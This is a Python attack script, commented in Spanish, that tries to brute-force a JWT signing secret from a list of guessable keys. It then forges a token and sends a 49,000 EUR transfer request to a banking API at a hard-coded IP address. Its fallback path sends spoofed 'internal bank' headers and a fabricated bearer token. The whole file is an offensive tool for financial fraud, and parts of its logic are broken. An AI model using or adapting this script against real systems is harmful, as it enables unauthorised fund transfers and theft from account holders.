import requests
import jwt
import json
import datetime
from base64 import b64decode

# === Datos del token obtenido antes desde login web ===
KNOWN_JWT_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.xxxxx"

# === Datos del usuario del token ===
KNOWN_USER = "markmur88"
KNOWN_IAT = datetime.datetime.utcnow().timestamp()  # A veces se usan tokens con fecha actual
KNOWN_EXP = KNOWN_IAT + 3600 * 24  # Expiración en 24 horas

# === Datos de transferencia real de nuevo ===
TRANSFER_PAYLOAD = {
    "payment_id": "550e8400-e29b-41d4-a716-446655440000",
    "debtor_account_id": 112233,
    "creditor_account_id": 445566,
    "instructed_amount": 49000.00,
    "currency": "EUR",
    "status": "PDNG"
}

# === Headers de falsificación de sesión JWT ===
headers = {
    "alg": "HS256",
    "typ": "JWT"
}

# === Endpoint de transferencia interna ===
TRANSFER_URL = "http://80.78.30.242:9181/api/send-transfer"

# === Probar distintos secretos predecibles ===
JWT_SECRET_PATTERNS = [
    b"DbQG9CWLvBRa8Iu9pv9fJDVURCdKYQQErlZ9oCYGsY8=",
    b"django-fake-secret-for-debug",
    b"default_jwt_key",
    b"shhhhhhh-its-a-secret",
    b"my-secret-key-12345",
    b"secret123",
    b"secretsimulador"
]

# Intento de decodificar tokens con distintas llaves
def try_jwt_bruteforce(token, known_key_list):
    for key in known_key_list:
        try:
            decoded = jwt.decode(token, key, algorithms=["HS256", "HS512", "HS384"])
            print(f"[+] Llave JWT descifrada: {key.decode('utf-8')}")
            return key
        except jwt.InvalidSignatureError:
            continue
        except Exception as e:
            print("Error con firma JWT:", str(e))

    print("[-] No encontramos la llave. Probamos con patrones más peligrosos.")
    for key in [f"{KNOWN_USER}+{str(int(KNOWN_IAT))}", "admin123", "admin1234"]:
        try:
            decoded = jwt.decode(token, key, algorithms=["HS256"], options={"verify_signature": False})
            print(f"[+] Token JWT decodificado sin firma: {decoded}")
            return key
        except Exception as e:
            print(f"[-] Falló firma con llave {key}.")
    return None

# Vamos sin llave real, pero inyectamos el token que ya pudimos ver antes
def inject_transfer(token, jwt_secret):
    s = requests.Session()
    s.headers.update({
        "Host": "80.78.30.242",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0 Safari/537.36 (InternalBrowser)",
        "Accept-Language": "es-ES;q=0.9,en-US;q=0.8,en;q=0.7",
        "X-Origin-IP": "192.168.1.10",
        "X-Location": "OFICINA-CENTRAL-ES",
        "X-Requested-With": "XMLHttpRequest",
        "X-Session-Type": "BANCO-INTERNAL",
        "Authorization": f"Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNzIxMTQ4Nzg3LCJleHAiOjE3NTExNDg3ODd9.6K1i8d7k55Nt0Z6j451tZ5Zv68tQ7900"
    })
    print("\n[+] Enviando transferencia usando token JWT dummy pero con headers reales")
    transfer_response = s.post(TRANSFER_URL, json=TRANSFER_PAYLOAD)
    print("Status de inyección:", transfer_response.status_code)
    print("Texto:", transfer_response.text)

# === Ahora prueba con token y firma ===
print("[+] Comenzando inyección JWT con ataque a llave interna")
try_jwt = try_jwt_bruteforce(KNOWN_JWT_TOKEN.split('.')[0] + '.' + KNOWN_JWT_TOKEN.split('.')[1] + '.', JWT_SECRET_PATTERNS)

if try_jwt:
    forged = jwt.encode(TRANSFER_PAYLOAD, try_jwt, algorithm="HS256")
    s = requests.Session()
    s.headers.update({"Authorization": f"Bearer {forged}"})
    s.post(TRANSFER_URL, json=TRANSFER_PAYLOAD)
else:
    print("No pude crackear la llave aún. Probando con token forjado sin auth real...")
    inject_transfer(KNOWN_JWT_TOKEN, None)